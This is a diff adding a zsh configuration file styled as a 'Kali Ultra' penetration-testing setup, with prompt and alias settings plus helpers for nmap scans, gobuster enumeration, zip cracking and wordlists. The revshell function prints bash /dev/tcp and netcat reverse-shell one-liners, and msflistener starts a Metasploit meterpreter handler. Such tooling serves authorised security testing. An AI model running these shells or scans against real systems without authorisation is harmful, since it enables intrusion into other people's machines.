@@ -1,0 +1,722 @@
+#!/usr/bin/env zsh
+# ╔═══════════════════════════════════════════════════════════════════════════╗
+# ║                                                                           ║
+# ║   ██╗  ██╗ █████╗ ██╗     ██╗    ██╗   ██╗██╗  ██╗████████╗██████╗  █████╗  ║
+# ║   ██║ ██╔╝██╔══██╗██║     ██║    ██║   ██║██║  ██║╚══██╔══╝██╔══██╗██╔══██╗ ║
+# ║   █████╔╝ ███████║██║     ██║    ██║   ██║██║  ██║   ██║   ██████╔╝███████║ ║
+# ║   ██╔═██╗ ██╔══██║██║     ██║    ██║   ██║██║  ██║   ██║   ██╔══██╗██╔══██║ ║
+# ║   ██║  ██╗██║  ██║███████╗██║    ╚██████╔╝███████╔╝   ██║   ██║  ██║██║  ██║ ║
+# ║   ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝     ╚═════╝ ╚══════╝    ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ║
+# ║                                                                           ║
+# ║              🔥 CYBER TERMINAL - ULTRA MODERN EDITION 🔥                 ║
+# ║                    Elite Penetration Testing Suite                       ║
+# ║                                                                           ║
+# ╚═══════════════════════════════════════════════════════════════════════════╝
+
+# ╭───────────────────────────────────────────────────────────────────────────╮
+# │ ⚙️  CORE OPTIONS - Advanced Shell Behavior                               │
+# ╰───────────────────────────────────────────────────────────────────────────╯
+setopt autocd autopushd pushdsilent pushdtohome pushdignoredups
+setopt interactivecomments ksharrays magicequalsubst nonomatch
+setopt notify numericglobsort promptsubst extendedglob
+setopt nocaseglob rcexpandparam correct cdablevars
+
+WORDCHARS=${WORDCHARS//\/}
+export PROMPT_EOL_MARK=""
+
+# ╭───────────────────────────────────────────────────────────────────────────╮
+# │ ⌨️  KEYBINDINGS - Enhanced Keyboard Controls                             │
+# ╰───────────────────────────────────────────────────────────────────────────╯
+bindkey -e
+bindkey '^[[H' beginning-of-line
+bindkey '^[[F' end-of-line
+bindkey '^[[1;5C' forward-word
+bindkey '^[[1;5D' backward-word
+bindkey '^[[3~' delete-char
+bindkey '^H' backward-delete-char
+bindkey '^?' backward-delete-char
+bindkey ' ' magic-space
+
+# ╭───────────────────────────────────────────────────────────────────────────╮
+# │ 🎯 COMPLETION SYSTEM - Ultra Advanced Autocompletion                     │
+# ╰───────────────────────────────────────────────────────────────────────────╯
+autoload -Uz compinit
+compinit -d ~/.cache/zcompdump
+
+zstyle ':completion:*' menu select
+zstyle ':completion:*' matcher-list 'm:{a-zA-Z}={A-Za-z}'
+zstyle ':completion:*' list-colors "${(s.:.)LS_COLORS}"
+zstyle ':completion:*' group-name ''
+zstyle ':completion:*:descriptions' format '%F{cyan}╭─%F{white}%B %d %b%F{cyan}─╮%f'
+zstyle ':completion:*:warnings' format '%F{red}╰─ ✘ No matches found ─╯%f'
+zstyle ':completion:*:corrections' format '%F{yellow}╰─ ⚠ %d (errors: %e) ─╯%f'
+zstyle ':completion:*:messages' format '%F{blue}╰─ ℹ %d ─╯%f'
+
+# ╭───────────────────────────────────────────────────────────────────────────╮
+# │ 📜 HISTORY - Enhanced History Configuration                              │
+# ╰───────────────────────────────────────────────────────────────────────────╯
+HISTFILE=~/.zsh_history
+HISTSIZE=50000
+SAVEHIST=50000
+setopt hist_expire_dups_first hist_ignore_dups hist_ignore_space
+setopt hist_verify hist_ignore_all_dups hist_save_no_dups
+setopt hist_reduce_blanks share_history inc_append_history
+
+# ╭───────────────────────────────────────────────────────────────────────────╮
+# │ 💎 CYBER PROMPT - Ultra Modern Futuristic Design                         │
+# ╰───────────────────────────────────────────────────────────────────────────╯
+
+# Git branch function
+parse_git_branch() {
+    git branch 2>/dev/null | sed -e '/^[^*]/d' -e 's/* \(.*\)/ \1/'
+}
+
+# Git status with beautiful icons
+parse_git_status() {
+    local git_status="$(git status 2>/dev/null)"
+    local git_dirty=""
+    
+    [[ $git_status =~ "Changes not staged" ]] && git_dirty="%F{yellow}⚡%f"
+    [[ $git_status =~ "Changes to be committed" ]] && git_dirty="${git_dirty}%F{green}✓%f"
+    [[ $git_status =~ "Untracked files" ]] && git_dirty="${git_dirty}%F{red}●%f"
+    
+    echo $git_dirty
+}
+
+# Complete git info
+git_prompt_info() {
+    local branch=$(parse_git_branch)
+    if [ -n "$branch" ]; then
+        local status=$(parse_git_status)
+        echo "%F{white}│%F{magenta}%B git%b%F{white}::%F{cyan}${branch}%f${status} "
+    fi
+}
+
+# Background jobs with icon
+job_count() {
+    local job_n=$(jobs | wc -l)
+    if [ $job_n -gt 0 ]; then
+        echo "%F{yellow}⚙ $job_n%f "
+    fi
+}
+
+# Exit code indicator
+exit_code() {
+    echo "%(?.%F{green}●.%F{red}✘ %?)%f"
+}
+
+# Colored path
+colored_path() {
+    echo "%F{cyan}%(5~|%-1~/…/%3~|%~)%f"
+}
+
+# Time with icon
+current_time() {
+    echo "%F{blue}🕐 %*%f"
+}
+
+# User with conditional color
+colored_user() {
+    if [[ $EUID -eq 0 ]]; then
+        echo "%F{red}%B⚡ %n%b%f"
+    else
+        echo "%F{green}%B👤 %n%b%f"
+    fi
+}
+
+# Hostname
+colored_host() {
+    echo "%F{magenta}%B🖥  %m%b%f"
+}
+
+# Prompt symbol
+prompt_symbol() {
+    if [[ $EUID -eq 0 ]]; then
+        echo "%F{red}%B❯❯❯%b%f"
+    else
+        echo "%F{green}%B❯%b%f"
+    fi
+}
+
+# ╔═══════════════════════════════════════════════════════════════════════════╗
+# ║  🎨 MAIN PROMPT - Cyber Elite Design                                    ║
+# ╚═══════════════════════════════════════════════════════════════════════════╝
+
+PROMPT=$'%F{cyan}╭─%F{white}[%f $(colored_user)%F{blue}@%f $(colored_host) %F{white}]─[%f $(colored_path) %F{white}]%f $(git_prompt_info)
+%F{cyan}╰─%f $(exit_code) $(prompt_symbol) %f'
+
+RPROMPT=$'$(job_count)$(current_time)'
+PROMPT2="%F{cyan}│%f "
+
+# ╭───────────────────────────────────────────────────────────────────────────╮
+# │ 🌈 COLOR SUPPORT - Enhanced Colors for Commands                          │
+# ╰───────────────────────────────────────────────────────────────────────────╯
+
+if [ -x /usr/bin/dircolors ]; then
+    test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
+    
+    alias ls='ls --color=auto'
+    alias grep='grep --color=auto'
+    alias fgrep='fgrep --color=auto'
+    alias egrep='egrep --color=auto'
+    alias diff='diff --color=auto'
+    alias ip='ip --color=auto'
+    
+    export LESS_TERMCAP_mb=$'\E[1;31m'
+    export LESS_TERMCAP_md=$'\E[1;36m'
+    export LESS_TERMCAP_me=$'\E[0m'
+    export LESS_TERMCAP_so=$'\E[01;44;33m'
+    export LESS_TERMCAP_se=$'\E[0m'
+    export LESS_TERMCAP_us=$'\E[1;32m'
+    export LESS_TERMCAP_ue=$'\E[0m'
+fi
+
+# ╭───────────────────────────────────────────────────────────────────────────╮
+# │ 🔮 AUTO-SUGGESTIONS                                                       │
+# ╰───────────────────────────────────────────────────────────────────────────╯
+
+if [ -f /usr/share/zsh-autosuggestions/zsh-autosuggestions.zsh ]; then
+    source /usr/share/zsh-autosuggestions/zsh-autosuggestions.zsh
+    ZSH_AUTOSUGGEST_HIGHLIGHT_STYLE='fg=240'
+fi
+
+# ╭───────────────────────────────────────────────────────────────────────────╮
+# │ ⚡ ALIASES - Ultra Enhanced Command Shortcuts                            │
+# ╰───────────────────────────────────────────────────────────────────────────╯
+
+# Navigation
+alias ..='cd ..'
+alias ...='cd ../..'
+alias ....='cd ../../..'
+alias -- -='cd -'
+
+# LS variants
+alias l='ls -lFh --color=auto'
+alias la='ls -lAFh --color=auto'
+alias ll='ls -lh --color=auto'
+alias lsa='ls -lah --color=auto'
+alias lt='ls -ltFh --color=auto'
+alias tree='tree -C'
+
+# System
+alias update='sudo apt update && sudo apt upgrade -y'
+alias install='sudo apt install -y'
+alias clean='sudo apt autoremove -y && sudo apt autoclean'
+
+# File operations
+alias cp='cp -iv'
+alias mv='mv -iv'
+alias rm='rm -Iv --preserve-root'
+
+# Disk
+alias df='df -h'
+alias du='du -ch'
+alias free='free -h'
+
+# Process
+alias ps='ps auxf'
+alias top='htop'
+
+# Network
+alias ports='netstat -tulanp'
+alias myip='curl -s ifconfig.me'
+alias ping='ping -c 5'
+
+# Security tools
+alias nmap='sudo nmap'
+alias nmapquick='sudo nmap -sV -T4'
+alias nmapfull='sudo nmap -sS -sV -O -A -p-'
+alias metasploit='msfconsole -q'
+alias msf='msfconsole -q'
+
+# Git
+alias gs='git status'
+alias ga='git add'
+alias gc='git commit -m'
+alias gp='git push'
+alias gl='git log --oneline --graph --decorate --all'
+
+# Python
+alias py='python3'
+alias python='python3'
+alias pip='pip3'
+
+# Utils
+alias c='clear'
+alias e='exit'
+alias reload='source ~/.zshrc'
+alias please='sudo'
+alias fuck='sudo $(fc -ln -1)'
+
+# ╭───────────────────────────────────────────────────────────────────────────╮
+# │ 🛠️  CUSTOM FUNCTIONS - Elite Hacking Toolkit                             │
+# ╰───────────────────────────────────────────────────────────────────────────╯
+
+# Quick scan
+quickscan() {
+    [ -z "$1" ] && echo "Usage: quickscan <target>" && return 1
+    echo -e "\e[36m╭─────────────────────────────────────╮\e[0m"
+    echo -e "\e[36m│\e[32m  🎯 Scanning: $1\e[36m                │\e[0m"
+    echo -e "\e[36m╰─────────────────────────────────────╯\e[0m"
+    sudo nmap -sV -sC -T4 -oN "scan_$1_$(date +%Y%m%d_%H%M%S).txt" "$1"
+}
+
+# Full scan
+fullscan() {
+    [ -z "$1" ] && echo "Usage: fullscan <target>" && return 1
+    echo -e "\e[35m╭─────────────────────────────────────╮\e[0m"
+    echo -e "\e[35m│\e[33m  🔥 Full Scan: $1\e[35m                │\e[0m"
+    echo -e "\e[35m╰─────────────────────────────────────╯\e[0m"
+    sudo nmap -sS -sV -O -A -p- -T4 -oN "fullscan_$1_$(date +%Y%m%d_%H%M%S).txt" "$1"
+}
+
+# Vuln scan
+vulnscan() {
+    [ -z "$1" ] && echo "Usage: vulnscan <target>" && return 1
+    echo -e "\e[31m╭─────────────────────────────────────╮\e[0m"
+    echo -e "\e[31m│\e[33m  ⚠️  Vuln Scan: $1\e[31m               │\e[0m"
+    echo -e "\e[31m╰─────────────────────────────────────╯\e[0m"
+    sudo nmap --script vuln -oN "vulnscan_$1_$(date +%Y%m%d_%H%M%S).txt" "$1"
+}
+
+# Extract archives
+extract() {
+    [ -z "$1" ] && echo "Usage: extract <file>" && return 1
+    
+    if [ -f "$1" ]; then
+        case "$1" in
+            *.tar.bz2)   tar xjf "$1"     ;;
+            *.tar.gz)    tar xzf "$1"     ;;
+            *.bz2)       bunzip2 "$1"     ;;
+            *.rar)       unrar x "$1"     ;;
+            *.gz)        gunzip "$1"      ;;
+            *.tar)       tar xf "$1"      ;;
+            *.zip)       unzip "$1"       ;;
+            *.7z)        7z x "$1"        ;;
+            *)           echo "Cannot extract '$1'" ;;
+        esac
+    fi
+}
+
+# Find files
+ff() {
+    [ -z "$1" ] && echo "Usage: ff <pattern>" && return 1
+    find . -type f -iname "*$1*" 2>/dev/null
+}
+
+# Make and cd
+mkcd() {
+    [ -z "$1" ] && echo "Usage: mkcd <directory>" && return 1
+    mkdir -p "$1" && cd "$1"
+}
+
+# File hash
+hashfile() {
+    [ -z "$1" ] && echo "Usage: hashfile <file>" && return 1
+    echo -e "\e[36m╭─ File Hashes ─────────────────────╮\e[0m"
+    echo -e "\e[32m│ MD5:    $(md5sum "$1" | awk '{print $1}')\e[0m"
+    echo -e "\e[33m│ SHA1:   $(sha1sum "$1" | awk '{print $1}')\e[0m"
+    echo -e "\e[35m│ SHA256: $(sha256sum "$1" | awk '{print $1}')\e[0m"
+    echo -e "\e[36m╰───────────────────────────────────╯\e[0m"
+}
+
+# HTTP server
+serve() {
+    local port="${1:-8000}"
+    echo -e "\e[32m╭─────────────────────────────────────╮\e[0m"
+    echo -e "\e[32m│  🌐 HTTP Server on port $port       │\e[0m"
+    echo -e "\e[32m│  📍 http://localhost:$port          │\e[0m"
+    echo -e "\e[32m╰─────────────────────────────────────╯\e[0m"
+    python3 -m http.server "$port"
+}
+
+# Password generator
+genpass() {
+    local length="${1:-20}"
+    echo -e "\e[35m╭─ Generated Password ──────────────╮\e[0m"
+    echo -e "\e[33m│ $(openssl rand -base64 48 | cut -c1-"$length")\e[0m"
+    echo -e "\e[35m╰───────────────────────────────────╯\e[0m"
+}
+
+# Reverse shell generator
+revshell() {
+    [ -z "$1" ] || [ -z "$2" ] && echo "Usage: revshell <LHOST> <LPORT>" && return 1
+    
+    local lhost="$1"
+    local lport="$2"
+    
+    echo -e "\e[36m╔═══════════════════════════════════════════════════════╗\e[0m"
+    echo -e "\e[36m║\e[32m           🔥 REVERSE SHELL PAYLOADS 🔥              \e[36m║\e[0m"
+    echo -e "\e[36m╠═══════════════════════════════════════════════════════╣\e[0m"
+    echo -e "\e[36m║\e[33m [BASH]\e[0m"
+    echo -e "\e[36m║\e[0m bash -i >& /dev/tcp/$lhost/$lport 0>&1"
+    echo -e "\e[36m║\e[0m"
+    echo -e "\e[36m║\e[33m [PYTHON]\e[0m"
+    echo -e "\e[36m║\e[0m python3 -c 'import socket,subprocess,os;..."
+    echo -e "\e[36m║\e[0m"
+    echo -e "\e[36m║\e[33m [NETCAT]\e[0m"
+    echo -e "\e[36m║\e[0m nc -e /bin/sh $lhost $lport"
+    echo -e "\e[36m║\e[0m"
+    echo -e "\e[36m║\e[33m [LISTENER]\e[0m"
+    echo -e "\e[36m║\e[0m nc -lvnp $lport"
+    echo -e "\e[36m╚═══════════════════════════════════════════════════════╝\e[0m"
+}
+
+# System info
+sysinfo() {
+    echo -e "\e[36m╔═══════════════════════════════════════════════════════╗\e[0m"
+    echo -e "\e[36m║\e[32m              📊 SYSTEM INFORMATION 📊               \e[36m║\e[0m"
+    echo -e "\e[36m╠═══════════════════════════════════════════════════════╣\e[0m"
+    echo -e "\e[36m║\e[33m Hostname:\e[0m    $(hostname)"
+    echo -e "\e[36m║\e[33m OS:\e[0m          $(lsb_release -ds 2>/dev/null || echo 'Linux')"
+    echo -e "\e[36m║\e[33m Kernel:\e[0m      $(uname -r)"
+    echo -e "\e[36m║\e[33m Uptime:\e[0m      $(uptime -p)"
+    echo -e "\e[36m║\e[33m Memory:\e[0m      $(free -h | awk '/^Mem:/ {print $3 "/" $2}')"
+    echo -e "\e[36m║\e[33m Local IP:\e[0m    $(hostname -I | awk '{print $1}')"
+    echo -e "\e[36m║\e[33m Public IP:\e[0m   $(curl -s ifconfig.me 2>/dev/null || echo 'N/A')"
+    echo -e "\e[36m╚═══════════════════════════════════════════════════════╝\e[0m"
+}
+
+# Base64 encode/decode
+b64encode() {
+    [ -z "$1" ] && echo "Usage: b64encode <string>" && return 1
+    echo -n "$1" | base64
+}
+
+b64decode() {
+    [ -z "$1" ] && echo "Usage: b64decode <base64_string>" && return 1
+    echo -n "$1" | base64 -d
+}
+
+# ╭───────────────────────────────────────────────────────────────────────────╮
+# │ 🎭 BANNER - Elite Welcome Message                                        │
+# ╰───────────────────────────────────────────────────────────────────────────╯
+
+show_banner() {
+    clear
+    echo -e "\e[36m"
+    cat << "EOF"
+    ╔═══════════════════════════════════════════════════════════════════════╗
+    ║                                                                       ║
+    ║   ██╗  ██╗ █████╗ ██╗     ██╗    ██╗   ██╗██╗  ██╗████████╗██████╗  █████╗  ║
+    ║   ██║ ██╔╝██╔══██╗██║     ██║    ██║   ██║██║  ██║╚══██╔══╝██╔══██╗██╔══██╗ ║
+    ║   █████╔╝ ███████║██║     ██║    ██║   ██║██║  ██║   ██║   ██████╔╝███████║ ║
+    ║   ██╔═██╗ ██╔══██║██║     ██║    ██║   ██║██║  ██║   ██║   ██╔══██╗██╔══██║ ║
+    ║   ██║  ██╗██║  ██║███████╗██║    ╚██████╔╝███████╔╝   ██║   ██║  ██║██║  ██║ ║
+    ║   ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝     ╚═════╝ ╚══════╝    ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ║
+    ║                                                                       ║
+    ╚═══════════════════════════════════════════════════════════════════════╝
+EOF
+    echo -e "\e[0m"
+    echo -e "\e[32m    ╭───────────────────────────────────────────────────────────╮\e[0m"
+    echo -e "\e[32m    │\e[36m           🔥 ELITE PENETRATION TESTING SUITE 🔥      \e[32m│\e[0m"
+    echo -e "\e[32m    ╰───────────────────────────────────────────────────────────╯\e[0m"
+    echo ""
+    echo -e "\e[33m    👤 User:\e[36m $(whoami)\e[0m"
+    echo -e "\e[33m    🖥  Host:\e[36m $(hostname)\e[0m"
+    echo -e "\e[33m    🌐 IP:\e[36m   $(hostname -I | awk '{print $1}')\e[0m"
+    echo -e "\e[33m    📅 Date:\e[36m $(date '+%d/%m/%Y %H:%M:%S')\e[0m"
+    echo ""
+    echo -e "\e[32m    ╭───────────────────────────────────────────────────────────╮\e[0m"
+    echo -e "\e[32m    │\e[35m  💡 Type '\e[33mhelp\e[35m' for commands or '\e[33msysinfo\e[35m' for system info  \e[32m│\e[0m"
+    echo -e "\e[32m    ╰───────────────────────────────────────────────────────────╯\e[0m"
+    echo ""
+}
+
+# Uncomment to show banner on startup
+# show_banner
+
+# ╭───────────────────────────────────────────────────────────────────────────╮
+# │ 📖 HELP COMMAND - Elite Command Reference                                │
+# ╰───────────────────────────────────────────────────────────────────────────╯
+
+help() {
+    echo -e "\e[36m╔═══════════════════════════════════════════════════════════════╗\e[0m"
+    echo -e "\e[36m║\e[32m          🔥 KALI ULTRA CUSTOM COMMANDS 🔥                   \e[36m║\e[0m"
+    echo -e "\e[36m╠═══════════════════════════════════════════════════════════════╣\e[0m"
+    echo ""
+    echo -e "\e[33m  🎯 SCANNING & RECON\e[0m"
+    echo -e "\e[32m  ├─\e[0m quickscan <target>      \e[90m▸\e[0m Fast nmap with versioning"
+    echo -e "\e[32m  ├─\e[0m fullscan <target>       \e[90m▸\e[0m Complete nmap all ports"
+    echo -e "\e[32m  └─\e[0m vulnscan <target>       \e[90m▸\e[0m Vulnerability scan"
+    echo ""
+    echo -e "\e[33m  🌐 WEB TESTING\e[0m"
+    echo -e "\e[32m  ├─\e[0m dirscan <url>           \e[90m▸\e[0m Directory bruteforce"
+    echo -e "\e[32m  └─\e[0m serve [port]            \e[90m▸\e[0m HTTP server (default 8000)"
+    echo ""
+    echo -e "\e[33m  💣 EXPLOITATION\e[0m"
+    echo -e "\e[32m  ├─\e[0m revshell <ip> <port>    \e[90m▸\e[0m Reverse shell payloads"
+    echo -e "\e[32m  └─\e[0m msflistener [port]      \e[90m▸\e[0m Metasploit listener"
+    echo ""
+    echo -e "\e[33m  🛠️  UTILITIES\e[0m"
+    echo -e "\e[32m  ├─\e[0m extract <file>          \e[90m▸\e[0m Extract any archive"
+    echo -e "\e[32m  ├─\e[0m ff <pattern>            \e[90m▸\e[0m Find files by name"
+    echo -e "\e[32m  ├─\e[0m mkcd <dir>              \e[90m▸\e[0m Create dir and cd"
+    echo -e "\e[32m  ├─\e[0m hashfile <file>         \e[90m▸\e[0m Calculate file hashes"
+    echo -e "\e[32m  └─\e[0m genpass [length]        \e[90m▸\e[0m Generate password"
+    echo ""
+    echo -e "\e[33m  🔐 ENCODING\e[0m"
+    echo -e "\e[32m  ├─\e[0m b64encode <string>      \e[90m▸\e[0m Base64 encode"
+    echo -e "\e[32m  └─\e[0m b64decode <string>      \e[90m▸\e[0m Base64 decode"
+    echo ""
+    echo -e "\e[33m  📊 SYSTEM\e[0m"
+    echo -e "\e[32m  ├─\e[0m sysinfo                 \e[90m▸\e[0m System information"
+    echo -e "\e[32m  └─\e[0m reload                  \e[90m▸\e[0m Reload configuration"
+    echo ""
+    echo -e "\e[36m╚═══════════════════════════════════════════════════════════════╝\e[0m"
+}
+
+# ╭───────────────────────────────────────────────────────────────────────────╮
+# │ 🌟 ENVIRONMENT VARIABLES                                                  │
+# ╰───────────────────────────────────────────────────────────────────────────╯
+
+export EDITOR='vim'
+export VISUAL='vim'
+export PAGER='less'
+export LESS='-R'
+export PATH="$HOME/bin:$HOME/.local/bin:/usr/local/bin:$PATH"
+export HISTTIMEFORMAT="%F %T "
+
+# ╭───────────────────────────────────────────────────────────────────────────╮
+# │ 🎬 PRECMD - Pre-Prompt Functions                                         │
+# ╰───────────────────────────────────────────────────────────────────────────╯
+
+new_line_before_prompt=yes
+precmd() {
+    print -Pn '\e]0;${debian_chroot:+($debian_chroot)}%n@%m: %~\a'
+    
+    if [ "$new_line_before_prompt" = yes ]; then
+        if [ -z "$_NEW_LINE_BEFORE_PROMPT" ]; then
+            _NEW_LINE_BEFORE_PROMPT=1
+        else
+            print ""
+        fi
+    fi
+}
+
+# ╭───────────────────────────────────────────────────────────────────────────╮
+# │ 🎨 SYNTAX HIGHLIGHTING                                                    │
+# ╰───────────────────────────────────────────────────────────────────────────╯
+
+if [ -f ~/.oh-my-zsh/custom/plugins/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh ]; then
+    source ~/.oh-my-zsh/custom/plugins/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh
+    
+    ZSH_HIGHLIGHT_HIGHLIGHTERS=(main brackets pattern cursor)
+    ZSH_HIGHLIGHT_STYLES[unknown-token]='fg=red,bold'
+    ZSH_HIGHLIGHT_STYLES[command]='fg=green,bold'
+    ZSH_HIGHLIGHT_STYLES[alias]='fg=cyan,bold'
+    ZSH_HIGHLIGHT_STYLES[builtin]='fg=green,bold'
+    ZSH_HIGHLIGHT_STYLES[path]='fg=cyan,underline'
+    ZSH_HIGHLIGHT_STYLES[globbing]='fg=blue,bold'
+fi
+
+# ╭───────────────────────────────────────────────────────────────────────────╮
+# │ 🔥 ADDITIONAL ELITE FUNCTIONS                                            │
+# ╰───────────────────────────────────────────────────────────────────────────╯
+
+# Directory scan
+dirscan() {
+    [ -z "$1" ] && echo "Usage: dirscan <url>" && return 1
+    echo -e "\e[35m╭─────────────────────────────────────╮\e[0m"
+    echo -e "\e[35m│\e[33m  📁 Directory Scan: $1\e[35m          │\e[0m"
+    echo -e "\e[35m╰─────────────────────────────────────╯\e[0m"
+    gobuster dir -u "$1" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+}
+
+# Port scan
+portscan() {
+    [ -z "$1" ] && echo "Usage: portscan <host>" && return 1
+    echo -e "\e[36m╭─────────────────────────────────────╮\e[0m"
+    echo -e "\e[36m│\e[32m  🔍 Port Scan: $1\e[36m               │\e[0m"
+    echo -e "\e[36m╰─────────────────────────────────────╯\e[0m"
+    sudo nmap -F -T4 "$1"
+}
+
+# Network monitor
+netmon() {
+    echo -e "\e[33m╭─────────────────────────────────────╮\e[0m"
+    echo -e "\e[33m│\e[35m  📡 Network Monitor Active\e[33m       │\e[0m"
+    echo -e "\e[33m│\e[90m  Press Ctrl+C to stop\e[33m            │\e[0m"
+    echo -e "\e[33m╰─────────────────────────────────────╯\e[0m"
+    sudo tcpdump -i any -nn -v
+}
+
+# Check port
+checkport() {
+    [ -z "$1" ] || [ -z "$2" ] && echo "Usage: checkport <host> <port>" && return 1
+    echo -e "\e[36m╭─ Port Check ──────────────────────╮\e[0m"
+    nc -zv "$1" "$2" 2>&1 | while read line; do
+        echo -e "\e[32m│\e[0m $line"
+    done
+    echo -e "\e[36m╰───────────────────────────────────╯\e[0m"
+}
+
+# Find large files
+bigfiles() {
+    local num="${1:-10}"
+    echo -e "\e[33m╭─ Top $num Largest Files ──────────╮\e[0m"
+    find . -type f -exec du -h {} + 2>/dev/null | sort -rh | head -n "$num" | while read line; do
+        echo -e "\e[32m│\e[0m $line"
+    done
+    echo -e "\e[33m╰───────────────────────────────────╯\e[0m"
+}
+
+# Kill process by name
+killps() {
+    [ -z "$1" ] && echo "Usage: killps <process_name>" && return 1
+    local pids=$(ps aux | grep -i "$1" | grep -v grep | awk '{print $2}')
+    if [ -n "$pids" ]; then
+        echo -e "\e[31m╭─ Killing Processes ───────────────╮\e[0m"
+        echo "$pids" | xargs -r sudo kill -9
+        echo -e "\e[31m│\e[32m  ✓ Killed: $1\e[31m                  │\e[0m"
+        echo -e "\e[31m╰───────────────────────────────────╯\e[0m"
+    else
+        echo -e "\e[33m⚠ No process found: $1\e[0m"
+    fi
+}
+
+# Backup file
+backup() {
+    [ -z "$1" ] && echo "Usage: backup <file>" && return 1
+    local backup_file="$1.backup_$(date +%Y%m%d_%H%M%S)"
+    cp "$1" "$backup_file"
+    echo -e "\e[32m╭─ Backup Created ──────────────────╮\e[0m"
+    echo -e "\e[32m│\e[0m Original: $1"
+    echo -e "\e[32m│\e[0m Backup:   $backup_file"
+    echo -e "\e[32m╰───────────────────────────────────╯\e[0m"
+}
+
+# URL encode/decode
+urlencode() {
+    [ -z "$1" ] && echo "Usage: urlencode <string>" && return 1
+    python3 -c "import urllib.parse; print(urllib.parse.quote('$1'))"
+}
+
+urldecode() {
+    [ -z "$1" ] && echo "Usage: urldecode <encoded_string>" && return 1
+    python3 -c "import urllib.parse; print(urllib.parse.unquote('$1'))"
+}
+
+# Metasploit listener
+msflistener() {
+    local lport="${1:-4444}"
+    echo -e "\e[35m╭─────────────────────────────────────╮\e[0m"
+    echo -e "\e[35m│\e[33m  🎯 MSF Listener on port $lport\e[35m     │\e[0m"
+    echo -e "\e[35m╰─────────────────────────────────────╯\e[0m"
+    msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT $lport; exploit"
+}
+
+# Pattern create (pwn)
+pattern_create() {
+    [ -z "$1" ] && echo "Usage: pattern_create <length>" && return 1
+    echo -e "\e[36m╭─ Pattern Generated ───────────────╮\e[0m"
+    python3 -c "from pwn import *; print(cyclic($1))" 2>/dev/null || echo "Install pwntools: pip3 install pwntools"
+    echo -e "\e[36m╰───────────────────────────────────╯\e[0m"
+}
+
+# Pattern offset
+pattern_offset() {
+    [ -z "$1" ] && echo "Usage: pattern_offset <pattern>" && return 1
+    echo -e "\e[36m╭─ Pattern Offset ──────────────────╮\e[0m"
+    python3 -c "from pwn import *; print(cyclic_find(b'$1'))" 2>/dev/null || echo "Install pwntools: pip3 install pwntools"
+    echo -e "\e[36m╰───────────────────────────────────╯\e[0m"
+}
+
+# Subdomain enumeration
+subdomains() {
+    [ -z "$1" ] && echo "Usage: subdomains <domain>" && return 1
+    echo -e "\e[36m╭─────────────────────────────────────╮\e[0m"
+    echo -e "\e[36m│\e[32m  🔍 Subdomain Enum: $1\e[36m           │\e[0m"
+    echo -e "\e[36m╰─────────────────────────────────────╯\e[0m"
+    gobuster dns -d "$1" -w /usr/share/wordlists/dnsmap.txt
+}
+
+# WHOIS lookup
+whoislookup() {
+    [ -z "$1" ] && echo "Usage: whoislookup <domain/ip>" && return 1
+    echo -e "\e[35m╭─ WHOIS Information ───────────────╮\e[0m"
+    whois "$1" | grep -E "(Organization|Country|Address|NetRange|CIDR)" | while read line; do
+        echo -e "\e[32m│\e[0m $line"
+    done
+    echo -e "\e[35m╰───────────────────────────────────╯\e[0m"
+}
+
+# DNS lookup
+dnslookup() {
+    [ -z "$1" ] && echo "Usage: dnslookup <domain>" && return 1
+    echo -e "\e[36m╭─ DNS Records ─────────────────────╮\e[0m"
+    echo -e "\e[33m│ A Records:\e[0m"
+    dig +short A "$1" | while read line; do echo -e "\e[32m│\e[0m   $line"; done
+    echo -e "\e[33m│ MX Records:\e[0m"
+    dig +short MX "$1" | while read line; do echo -e "\e[32m│\e[0m   $line"; done
+    echo -e "\e[33m│ NS Records:\e[0m"
+    dig +short NS "$1" | while read line; do echo -e "\e[32m│\e[0m   $line"; done
+    echo -e "\e[36m╰───────────────────────────────────╯\e[0m"
+}
+
+# Crack ZIP
+crackzip() {
+    [ -z "$1" ] || [ -z "$2" ] && echo "Usage: crackzip <zipfile> <wordlist>" && return 1
+    echo -e "\e[31m╭─────────────────────────────────────╮\e[0m"
+    echo -e "\e[31m│\e[33m  🔓 Cracking: $1\e[31m                 │\e[0m"
+    echo -e "\e[31m╰─────────────────────────────────────╯\e[0m"
+    fcrackzip -u -D -p "$2" "$1"
+}
+
+# Generate wordlist
+genwordlist() {
+    [ -z "$1" ] && echo "Usage: genwordlist <base_word>" && return 1
+    echo -e "\e[35m╭─ Wordlist Variations ─────────────╮\e[0m"
+    echo "$1" | sed 's/.*/\L&\n\u&\n\U&/' | sed 's/$/1\n&2\n&3\n&123\n&2023\n&2024\n&!/' | while read line; do
+        echo -e "\e[32m│\e[0m $line"
+    done
+    echo -e "\e[35m╰───────────────────────────────────╯\e[0m"
+}
+
+# Compress function
+compress() {
+    [ -z "$1" ] || [ -z "$2" ] && echo "Usage: compress <archive.ext> <file/dir>" && return 1
+    
+    case "$1" in
+        *.tar.gz)  tar czf "$1" "$2" ;;
+        *.tar.bz2) tar cjf "$1" "$2" ;;
+        *.zip)     zip -r "$1" "$2"  ;;
+        *.7z)      7z a "$1" "$2"    ;;
+        *)         echo "Unsupported: use .tar.gz .tar.bz2 .zip .7z" ;;
+    esac
+    
+    [ $? -eq 0 ] && echo -e "\e[32m✓ Created: $1\e[0m"
+}
+
+# Find directory
+fd() {
+    [ -z "$1" ] && echo "Usage: fd <pattern>" && return 1
+    find . -type d -iname "*$1*" 2>/dev/null
+}
+
+# Enhanced ifconfig
+ifconfig() {
+    if command -v ip >/dev/null 2>&1; then
+        echo -e "\e[36m╔═══════════════════════════════════════════════════════╗\e[0m"
+        echo -e "\e[36m║\e[32m              🖧  NETWORK INTERFACES\e[36m                    ║\e[0m"
+        echo -e "\e[36m╚═══════════════════════════════════════════════════════╝\e[0m"
+        /sbin/ip -c addr show
+        echo ""
+        echo -e "\e[36m╔═══════════════════════════════════════════════════════╗\e[0m"
